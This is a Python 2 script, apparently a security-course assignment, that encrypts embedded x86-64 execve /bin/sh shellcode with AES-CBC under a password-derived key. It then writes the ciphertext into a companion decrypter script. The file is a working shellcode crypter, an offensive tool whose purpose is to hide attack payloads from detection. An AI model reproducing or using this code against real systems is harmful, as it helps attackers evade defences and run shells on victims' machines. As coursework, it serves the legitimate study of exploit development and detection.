#!/usr/bin/python
# Author: Robert Taylor
# http://a41l4.blogspot.ca/2017/03/assignment-7.html
import os
import sys
from Crypto.Cipher import AES
import hashlib
import fileinput

shellcode=("\x31\xf6\xf7\xe6\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05")
password=''
BLOCK_SIZE=16
IV=''
shellcode_array = '' 
my_ciphered = ''
my_deciphered = ''

def prnt(stuff):
    """ Print strings to stdout without automatically outputing a
        terminating line feed or space.
    """
    sys.stdout.write(stuff)

def print_array(thearray):
    """ Print the bytearray """
    for x in bytearray(thearray):
        prnt('\\x%02x' %x)
    prnt('\n')

def nulls(anarray):
    """ Test for nulls in a byte array. 
        Return 1 if yes, 0 if no. 
    """
    for x in bytearray(anarray):
        if x == 0:
            return 1
    return 0

def generate_iv():
    """ Generates a new random BLOCK_SIZE IV. """
    global IV
    IV = '' # clear any previous contents
    for i in range(BLOCK_SIZE):
        IV += (os.urandom(1))
    if nulls(IV):
        generate_iv()

def hash_password():
    """ Hash the password. """
    global password
    try:
        password = hashlib.sha256(sys.argv[1]).digest()
        try:
            for i in range(30000):
                password = hashlib.sha256(password + str(i) + sys.argv[1]).digest()
        except:
            print("Something is wrong with your hashing loop")
            sys.exit()
    except:
	print("Please enter your password as the first argument to the script")
        sys.exit()
  

def extend_shell():
    """ If shellcode length is not evenly divisable by 16
        figure out how many bytes to add and tack them onto
        the end. These will be random bytes.
    """
    global shellcode_array
    while (len(shellcode_array) % 16) != 0:
        abyte = os.urandom(1)
        if not nulls(abyte):
            shellcode_array += (os.urandom(1))

def init():
    """ Initialize the password and the shellcode_array. """ 
    hash_password()
    global shellcode_array
    shellcode_array = shellcode
    # shellcode needs to be envenly divisible by 16
    extend_shell()

def encrypt():
    """ Encrypt the shellcode. """
    global my_ciphered
    generate_iv()
    obj = AES.new(password, AES.MODE_CBC, IV)
    my_ciphered = IV + obj.encrypt(shellcode_array)

def decrypt():
    """ Decrypt the shellcode. R.T. """
    global my_deciphered
    IV = my_ciphered[:BLOCK_SIZE]
    obj = AES.new(password, AES.MODE_CBC, IV)
    my_deciphered = obj.decrypt(my_ciphered[BLOCK_SIZE:])

def edit_decrypt_file():
    encstring='my_ciphered=("'
    for x in bytearray(my_ciphered):
        encstring += ('\\x%02x' %x)
    encstring += '")\n'
    for line in fileinput.input("Decrypt1434.py", inplace=True):
        if "my_ciphered=" in line:
            line = encstring
        print line,

def main():
    init()
    encrypt()
    # if there are nulls in the encrypted output, start over
    if nulls(my_ciphered):
        main()
        # Note that because this is a recursive call, any instruction you put
        # after this could be repeated. So put it in else so it only happens
        # once.
    else:
        print_array(my_ciphered)
        edit_decrypt_file()
        #print("Testing decryption")
        #decrypt()
        #print_array(shellcode)
        #print_array(my_deciphered)

# Standard boilerplate to call the main() function to begin
# the program. Helps to avoid calling main if this file is imported to another program.
if __name__ == '__main__':
    main()






